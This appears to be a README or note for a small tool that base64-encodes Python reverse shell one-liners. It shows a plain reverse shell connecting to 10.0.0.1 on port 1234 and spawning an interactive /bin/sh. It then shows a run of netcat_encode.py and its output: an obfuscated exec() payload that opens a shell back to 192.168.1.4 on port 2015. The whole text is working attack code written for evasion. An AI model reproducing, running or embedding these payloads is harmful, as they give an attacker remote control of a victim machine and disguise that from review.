# python_fantan_shell_encode
base64 encoding this: python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1″,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);’


<p>
➜   python netcat_encode.py 192.168.1.4 2015
<p>
python -c "exec( __import__( 'base64' ).decodestring( 'cz1fX2ltcG9ydF9fKCdzb2NrZXQnKS5zb2NrZXQoX19pbXBvcnRfXygnc29ja2V0JykuQUZfSU5F\nVCxfX2ltcG9ydF9fKCdzb2NrZXQnKS5TT0NLX1NUUkVBTSk7IHMuY29ubmVjdCgoJzE5Mi4xNjgu\nMS40JywgMjAxNSkpOyBfX2ltcG9ydF9fKCdvcycpLmR1cDIocy5maWxlbm8oKSwwKTsgX19pbXBv\ncnRfXygnb3MnKS5kdXAyKHMuZmlsZW5vKCksMSk7IF9faW1wb3J0X18oJ29zJykuZHVwMihzLmZp\nbGVubygpLDIpOyBwPV9faW1wb3J0X18oJ3N1YnByb2Nlc3MnKS5jYWxsKFsnL2Jpbi9zaCcsJy1p\nJ10p\n' ) )"
